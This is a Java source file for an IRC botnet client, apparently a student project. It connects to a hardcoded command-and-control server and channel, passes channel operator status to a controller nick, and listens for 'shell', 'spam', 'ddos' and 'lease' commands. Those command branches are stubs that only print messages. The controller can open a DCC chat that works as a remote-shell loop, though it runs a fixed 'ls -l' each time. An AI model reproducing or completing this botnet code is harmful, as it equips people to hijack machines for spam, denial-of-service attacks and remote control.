import java.io.*;
import java.net.*;
import java.util.*;

import org.jibble.pircbot.*;

public class BotnetClient extends PircBot {
	private static final boolean DEBUG = true;
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "bot";
	private static final String CC = "RandR";
	private static final int PORT = 6667;
	private String uuid;
	private String id;
	private Scanner input;
	private String operator;
	private DccChat chat;
	
	public static void main(String[] args) {
		BotnetClient bn = new BotnetClient();
	}
	
	public BotnetClient() {
		//MsgEncrypt cipher = MsgEncrypt.getInstance(key, secretKey);
		uuid = UUID.randomUUID().toString();
		id = NAME + "_" + uuid;
		input = new Scanner(System.in);
		try {
			setVerbose(DEBUG);
			setName(id);
			setMessageDelay(0);
			connect(SERVER, PORT);
			joinChannel(CHANNEL);
			setMode(CHANNEL, "+s");
			input = new Scanner(System.in);
		} catch (NickAlreadyInUseException e) {
			uuid = UUID.randomUUID().toString();
			id = NAME + "_" + uuid;
			changeNick(id);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
		
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		message = message.toLowerCase();
		if (message.startsWith("shell")) {
			System.out.println("Exposing Shell");
		} else if (message.startsWith("spam")) {
			System.out.println("Sending Spam");
		} else if (message.startsWith("ddos")) {
			System.out.println("DDOSing");
		} else if (message.startsWith("lease")) {
			System.out.println("Leasing Myself");
		} else {
			System.out.println("<" + sender + ">: " + message);
		}
	}
	
	protected void onOp(String channel, String sourceNick, String sourceLogin, String sourceHostname, String recipient) {
		operator = recipient;
	}
	
	protected void onJoin(String channel, String sender, String login, String hostname) {
		if (id.equals(operator) && sender.equals(CC)) {
			op(CHANNEL, sender);
			deOp(CHANNEL, id);
			System.out.println("Operator status given to " + CC);
		} else {
			System.out.println("Current op:" + operator);
		}
	}
	

	protected void onIncomingChatRequest(DccChat chatObj) {
		Runtime r = Runtime.getRuntime();
		try {
			System.out.println("." + chatObj.getNick() + ".");
			System.out.println(chatObj.getNick().equalsIgnoreCase(CC));
			if (chatObj.getNick().equalsIgnoreCase(CC)) {
				System.out.println("in the if, about to accept chat");
				chat = chatObj;
				chat.accept();
				System.out.println("Chat accepted");
	        	chat.sendLine("$: ");
	        	System.out.println("Sent response");
	        	String command = chat.readLine();
	        	System.out.println(command);
	        	while (!command.equalsIgnoreCase("quit shell")) {
	        		Process p = r.exec("ls -l .");
	        		p.waitFor();
	        		Scanner in = new Scanner(p.getInputStream());
	        		String response = "";
	        		while (in.hasNextLine()) {
	        			response += in.nextLine() + "\n";
	        		}
	        		chat.sendLine(response + "\n$: ");
	        		command = chat.readLine();
	        	}
	        	chat.close();
			} else {
				chat = null;
			}
	     } catch (Exception e) {
	    	 e.printStackTrace();
	     }
	}
	
	public void write(String s) {
		sendMessage(CHANNEL, s);
	}
}
